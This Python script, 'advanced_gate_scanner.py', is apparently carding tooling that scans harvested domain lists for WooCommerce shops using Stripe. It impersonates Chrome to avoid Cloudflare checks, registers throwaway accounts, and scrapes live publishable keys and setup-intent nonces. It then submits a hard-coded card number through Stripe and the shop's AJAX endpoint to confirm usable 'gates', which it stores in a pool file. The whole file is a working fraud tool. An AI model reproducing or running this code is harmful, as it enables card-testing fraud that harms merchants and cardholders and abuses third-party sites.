# language: Python 3.12+, file: advanced_gate_scanner.py, target: Windows 11, deps: curl_cffi
import asyncio
import json
import os
import random
import re
import socket
import string
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from curl_cffi.requests import AsyncSession

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

PROBE_DUMMY_CARD = {"number": "5175465382242090", "mm": "09", "yy": "2030", "cvc": "018"}

def rand_str(k=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

def resolve_dns(host: str) -> str | None:
    try:
        socket.gethostbyname(host)
        return host
    except Exception:
        return None


async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore) -> dict | None:
    """Stage 1: Fast GET /my-account/ — check availability, register nonce & pk_live."""
    base = f"https://{domain}"
    url = f"{base}/my-account/"
    async with sem:
        try:
            async with AsyncSession(impersonate="chrome131", verify=False) as s:
                r = await s.get(url, timeout=8)
                if r.status_code != 200:
                    return None
                html = r.text
        except Exception:
            return None

    # Check Cloudflare hardcore challenges (Turnstile / captcha block)
    is_hard_cf = (
        "Just a moment..." in html or 
        "Attention Required! | Cloudflare" in html or
        "challenge-platform" in html or
        "cf-turnstile-wrapper" in html
    )
    if is_hard_cf:
        return None
        
    reg_nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
    reg_nonce = reg_nonce_m.group(1) if reg_nonce_m else None
    if not reg_nonce:
        return None
        
    pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', html)
    pk_live = pk_m[0] if pk_m else None

    has_stripe_indicator = (
        pk_live is not None or
        "wc-stripe" in html or
        "stripe.js" in html or
        "wc_stripe" in html or
        "payment_method_stripe" in html
    )

    return {
        "domain": domain,
        "base": base,
        "reg_nonce": reg_nonce,
        "pk_live": pk_live,
        "has_stripe": has_stripe_indicator
    }


async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: str, sem: asyncio.Semaphore) -> dict | None:
    """Stage 2: Real registration POST -> check wordpress_logged_in.
       Stage 3: Scrape /my-account/add-payment-method/ -> extract pk_live, upe_nonce / legacy_nonce.
       Stage 4: Live SetupIntent confirm probe -> confirm working gate.
    """
    async with sem:
        try:
            async with AsyncSession(impersonate="chrome131", verify=False) as s:
                reg_url = f"{base}/my-account/"
                
                # Fetch fresh page to inspect form fields
                r_get = await s.get(reg_url, timeout=8)
                if r_get.status_code != 200:
                    return None
                html = r_get.text
                
                nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
                reg_nonce = nonce_m.group(1) if nonce_m else initial_nonce
                has_username = 'name="username"' in html
                
                uname = f"usr_{rand_str(8)}"
                email = f"alex.{rand_str(8)}@gmail.com"
                pwd = f"Sec_{rand_str(8)}!9aA"
                
                body = {
                    "email": email,
                    "password": pwd,
                    "woocommerce-register-nonce": reg_nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register"
                }
                if has_username:
                    body["username"] = uname

                # Scrape hidden honeypots
                reg_form = re.search(r'<form[^>]*class="[^"]*register[^"]*"[^>]*>(.*?)</form>', html, re.S)
                if reg_form:
                    hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', reg_form.group(1))
                    for inp in hidden_inputs:
                        nm = re.search(r'name=["\']([^"\']+)["\']', inp)
                        vl = re.search(r'value=["\']([^"\']*)["\']', inp)
                        if nm and vl and nm.group(1) not in body:
                            body[nm.group(1)] = vl.group(1)

                headers = {"Origin": base, "Referer": reg_url}
                r_post = await s.post(reg_url, data=body, headers=headers, timeout=12)
                
                cookies = s.cookies.get_dict()
                logged_in = any("wordpress_logged_in" in k for k in cookies)
                if not logged_in:
                    return None

                # === STAGE 3: Authenticated Scrape add-payment-method ===
                add_pm_url = f"{base}/my-account/add-payment-method/"
                r_pm = await s.get(add_pm_url, timeout=10)
                pm_html = r_pm.text

                # Check if test mode explicitly
                if "pk_test_" in pm_html and "pk_live_" not in pm_html:
                    return None

                pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
                pk = pk_m[0] if pk_m else ""
                
                upe_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
                upe_nonce = upe_m.group(1) if upe_m else ""
                
                legacy_m = re.search(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', pm_html)
                legacy_nonce = legacy_m.group(1) if legacy_m else ""

                if not legacy_nonce:
                    # Alternative legacy nonce parameter
                    leg2_m = re.search(r'createSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
                    if leg2_m:
                        legacy_nonce = leg2_m.group(1)

                if not pk or (not upe_nonce and not legacy_nonce):
                    return None

                # === STAGE 4: SetupIntent Live Mode Probe ===
                fp = {"guid": str(uuid.uuid4()), "muid": str(uuid.uuid4()), "sid": str(uuid.uuid4())}
                tok_body = {
                    "type": "card",
                    "billing_details[name]": "Alex Vance",
                    "billing_details[address][postal_code]": "10001",
                    "billing_details[address][country]": "US",
                    "card[number]": PROBE_DUMMY_CARD["number"],
                    "card[cvc]": PROBE_DUMMY_CARD["cvc"],
                    "card[exp_month]": PROBE_DUMMY_CARD["mm"],
                    "card[exp_year]": PROBE_DUMMY_CARD["yy"],
                    "guid": fp["guid"],
                    "muid": fp["muid"],
                    "sid": fp["sid"],
                    "pasted_fields": "number,cvc",
                    "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
                    "referrer": base,
                    "time_on_page": "32100",
                    "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
                    "client_attribution_metadata[merchant_integration_source]": "elements",
                    "client_attribution_metadata[merchant_integration_subtype]": "card-element",
                    "client_attribution_metadata[merchant_integration_version]": "2017",
                    "key": pk,
                }
                tok_headers = {"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"}
                
                r_tok = await s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers, timeout=8)
                tok_data = r_tok.json()
                if "id" not in tok_data:
                    return None

                pm_id = tok_data["id"]

                ajax_headers = {
                    "Origin": base,
                    "Referer": add_pm_url,
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept": "application/json",
                }
                
                if upe_nonce:
                    conf_payload = {
                        "action": "wc_stripe_create_and_confirm_setup_intent",
                        "_ajax_nonce": upe_nonce,
                        "wc-stripe-payment-method": pm_id,
                        "wc-stripe-payment-type": "card",
                    }
                    ajax_endpoint = f"{base}/wp-admin/admin-ajax.php"
                else:
                    conf_payload = {
                        "stripe_source_id": pm_id,
                        "nonce": legacy_nonce,
                    }
                    ajax_endpoint = f"{base}/?wc-ajax=wc_stripe_create_setup_intent"

                r_conf = await s.post(ajax_endpoint, data=conf_payload, headers=ajax_headers, timeout=12)
                conf_resp = r_conf.json()

                raw_str = json.dumps(conf_resp).lower()
                if "testmode_charges_only" in raw_str or "secret_key_required" in raw_str or "livemode" in raw_str and "false" in raw_str:
                    return None

                is_live_verdict = (
                    conf_resp.get("success") is True or
                    "declined" in raw_str or
                    "incorrect" in raw_str or
                    "requires_action" in raw_str or
                    "succeeded" in raw_str or
                    "card_error" in raw_str
                )

                if is_live_verdict:
                    return {
                        "domain": domain,
                        "base_url": base,
                        "reg_url": reg_url,
                        "add_pm_url": add_pm_url,
                        "ajax_url": ajax_endpoint,
                        "pk_live": pk,
                        "gate_type": "wc_stripe_upe" if upe_nonce else "wc_stripe_legacy",
                        "upe_nonce": upe_nonce,
                        "legacy_nonce": legacy_nonce,
                        "updated_at": int(time.time()),
                        "status": "READY"
                    }
        except Exception:
            return None
    return None


async def main():
    print("=" * 80)
    print("[*] ADVANCED GATE SCANNER v4 (curl_cffi Chrome TLS Multi-Surface Engine)")
    print("=" * 80)
    
    # 1. Load candidate domains
    domains = []
    candidates = [
        "data/harvested_domains.txt", "data/probe_targets.txt",
        "harvested_domains.txt", "probe_targets.txt"
    ]
    for fn in candidates:
        if os.path.exists(fn):
            try:
                with open(fn, encoding="utf-8") as f:
                    domains.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
            except Exception:
                pass

    junk = ['blogspot', '1drv.ms', 'supportally', 'abc.com', 'google', 'wordpress', 'github', 'pastebin', 'gravatar']
    cleaned = []
    for d in domains:
        d = re.sub(r'[^a-z0-9.-]', '', d.strip().lower())
        if d and "." in d and not d.endswith(".") and not any(j in d for j in junk):
            cleaned.append(d)
    raw_domains = sorted(list(set(cleaned)))
    print(f"[*] Loaded {len(raw_domains)} sanitized candidate domains.", flush=True)

    # Load existing verified ready gates to preserve them
    existing_ready = []
    ready_file = os.path.join("data", "ready_gates.json")
    if os.path.exists(ready_file):
        try:
            with open(ready_file, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, list):
                    existing_ready = data
            print(f"[*] Loaded {len(existing_ready)} existing ready gates from pool.")
        except Exception:
            pass

    # 2. DNS resolve
    print("[*] Stage 0: Pre-resolving DNS...", flush=True)
    live_dns_domains = []
    with ThreadPoolExecutor(max_workers=50) as pool:
        results = pool.map(resolve_dns, raw_domains)
        for r in results:
            if r:
                live_dns_domains.append(r)
    print(f"[+] DNS Live: {len(live_dns_domains)} / {len(raw_domains)}", flush=True)

    # 3. Stage 1: Fast Surface Probing
    print(f"\n[*] Stage 1: Fast Surface Probing on {len(live_dns_domains)} domains...", flush=True)
    sem_s1 = asyncio.Semaphore(30)
    s1_tasks = [probe_stage1_fast_surface(d, sem_s1) for d in live_dns_domains]
    s1_results = await asyncio.gather(*s1_tasks)
    s1_passed = [r for r in s1_results if r]
    print(f"[+] Stage 1 Passed: {len(s1_passed)} clean domains with open registration forms.")

    # 4. Stages 2-4: Deep Qualification
    print(f"\n[*] Stages 2-4: Deep Qualification (Session Reg -> Scrape Nonces -> Confirm Probe)...", flush=True)
    sem_deep = asyncio.Semaphore(15)
    deep_tasks = [
        probe_stage2_3_4_qualification(s["domain"], s["base"], s["reg_nonce"], sem_deep)
        for s in s1_passed
    ]
    deep_results = await asyncio.gather(*deep_tasks)
    new_ready_gates = [r for r in deep_results if r]

    # Merge newly found gates with existing ready gates (deduplicate by domain)
    ready_dict = {g["domain"]: g for g in existing_ready}
    for g in new_ready_gates:
        ready_dict[g["domain"]] = g
    final_ready_gates = list(ready_dict.values())

    print("\n" + "=" * 80)
    print(f"[🔥] FINAL QUALIFIED SETUPINTENT GATES IN POOL: {len(final_ready_gates)}")
    print("=" * 80)
    
    for g in final_ready_gates:
        pk_display = g.get('pk_live', '')[:24] + "..." if g.get('pk_live') else "N/A"
        print(f"  [READY] {g['domain']:32} | Type: {g.get('gate_type', 'unknown'):18} | PK: {pk_display}")

    os.makedirs("data", exist_ok=True)
    with open(ready_file, "w", encoding="utf-8") as f:
        json.dump(final_ready_gates, f, indent=2)

    active_file = os.path.join("data", "active_surfaces.json")
    with open(active_file, "w", encoding="utf-8") as f:
        json.dump(final_ready_gates, f, indent=2)
    print(f"\n[+] Saved {len(final_ready_gates)} ready gates to {ready_file} and {active_file}")


if __name__ == "__main__":
    asyncio.run(main())
